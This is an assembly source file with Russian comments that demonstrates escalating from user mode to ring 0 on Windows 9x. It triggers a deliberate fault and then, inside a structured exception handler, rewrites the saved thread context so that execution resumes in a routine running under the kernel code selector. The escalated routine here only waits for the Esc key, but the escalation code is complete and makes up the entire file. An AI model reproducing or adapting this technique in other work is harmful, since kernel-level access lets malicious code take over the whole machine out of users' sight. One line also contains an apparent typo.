; Переход в нулевое кольцо под Win9x 
; Метод: SEH

.586p
.model flat

callW           macro   x
                extern  x:PROC
                call    x
                endm

.data

_Start:
                push    offset errorhandler1
                push    dword ptr fs:[0]
                mov     fs:[0], esp
                lea     EBX, ring0_proc   ; EBX = адрес подпрограммы в ring-0
                xor     EAX, EAX
                mov     EAX, [EAX]
errorhandler1:
                mov     ESI, [esp+0ch]    ; EAX = Lp2CONTEXT
                mov     EAX, [ESI+0a4h]   ; EAX = OldEBX
                mov     [ESI+0b8h], EAX   ; NewEIP = OldEBX
                mov     EAX, 28h
                mov     [ESI+0bch], EAX   ; Подменим сегмент CS на 28h 
					  ; (т.е. системный)
                xor     EAX, EAX
                ret

; код в нулевом кольце!
ring0_proc:                                ; r0 start
                push    ss ss
                pop     ds es

                pushad

; Ждем нажатия Esc
WaitESC:                                   
                in        AL, 60h
                cmp       AL, 1
                jne       WaitESC

                popad
                inc dword ptr [Flag]       ; устанавливаем флаг завершённости       
                jmp $                             

                Flag dd 0
                ddd dd ?
.code

start:
                push    offset offset ddd  ; Запускаем  "нитку"
                push    0                  ;
                push    0                  ;
                push    offset  _Start     ;
                push    0                  ;
                push    0                  ;
                callW   CreateThread       ;
                Waits:
                mov EAX,[Flag]             ; Ждем ее завершения
                or EAX,EAX
                jz Waits

exit:
                push        00000000h
                callW       ExitProcess
end start